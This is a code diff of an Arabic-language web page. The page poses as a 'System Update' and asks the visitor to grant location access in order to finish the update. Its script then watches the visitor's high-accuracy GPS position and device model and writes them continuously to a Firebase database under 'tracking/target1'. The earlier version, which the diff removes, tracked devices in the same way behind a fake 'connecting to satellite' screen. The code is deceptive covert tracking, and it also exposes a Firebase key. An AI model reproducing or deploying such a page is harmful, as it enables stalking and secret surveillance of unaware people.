@@ -1,22 +1,18 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
     <link rel="manifest" href="manifest.json">
-    <title>Checking Connection</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
-<body style="background:#000; color:#00ffcc; font-family:monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
-    <div style="text-align:center; border:1px solid #00ffcc; padding:20px; box-shadow:0 0 20px #00ffcc;">
-        <h2 id="device">INITIALIZING...</h2>
-        <p id="status">CONNECTING TO SATELLITE...</p>
-    </div>
+<body style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
+    <h2>جاري فحص وتحديث النظام</h2>
+    <p>برجاء السماح بالوصول للموقع لاكمال التحديث</p>
 
     <script>
-        if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
-
         const firebaseConfig = {
             apiKey: "AIzaSyBCCXqcD29paJYKGI6eevmUuRa4bW11ccU",
             databaseURL: "https://omar-store-2025-default-rtdb.firebaseio.com",
@@ -25,36 +21,27 @@
         };
         firebase.initializeApp(firebaseConfig);
 
-        // جلب نوع الجهاز بالظبط
-        const ua = navigator.userAgent;
-        let deviceName = "Unknown Device";
-        if (/OPPO/i.test(ua)) deviceName = "Oppo Device";
-        else if (/Samsung/i.test(ua)) deviceName = "Samsung Galaxy";
-        else if (/iPhone/i.test(ua)) deviceName = "iPhone";
-        else if (/Redmi|Xiaomi/i.test(ua)) deviceName = "Xiaomi/Redmi";
-        else deviceName = navigator.platform;
+        function getDeviceModel() {
+            const ua = navigator.userAgent;
+            if (ua.includes("OPPO")) return "Oppo Device";
+            if (ua.includes("Samsung") || ua.includes("SM-")) return "Samsung Galaxy";
+            if (ua.includes("iPhone")) return "iPhone";
+            if (ua.includes("Redmi") || ua.includes("Xiaomi")) return "Xiaomi Redmi";
+            return navigator.platform + " Mobile";
+        }
 
-        document.getElementById('device').innerText = deviceName;
-
-        const options = { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 };
-
-        navigator.geolocation.watchPosition((pos) => {
-            const accuracy = Math.round(pos.coords.accuracy);
-            // تحديث فقط لو الدقة ممتازة (أقل من 25 متر)
-            if (accuracy <= 25) {
-                firebase.database().ref('tracking/' + deviceName.replace(/\s/g, '_')).set({
-                    device: deviceName,
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition((pos) => {
+                const data = {
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude,
-                    acc: accuracy,
-                    time: new Date().toLocaleTimeString('ar-EG'),
-                    last_update: firebase.database.ServerValue.TIMESTAMP
-                });
-                document.getElementById('status').innerText = "SIGNAL SECURED ✅";
-            } else {
-                document.getElementById('status').innerText = "IMPROVING ACCURACY: " + accuracy + "m";
-            }
-        }, null, options);
+                    acc: Math.round(pos.coords.accuracy),
+                    device: getDeviceModel(),
+                    time: new Date().toLocaleTimeString('ar-EG')
+                };
+                firebase.database().ref('tracking/target1').set(data);
+            }, (err) => { console.error(err) }, { enableHighAccuracy: true });
+        }
     </script>
 </body>
 </html>
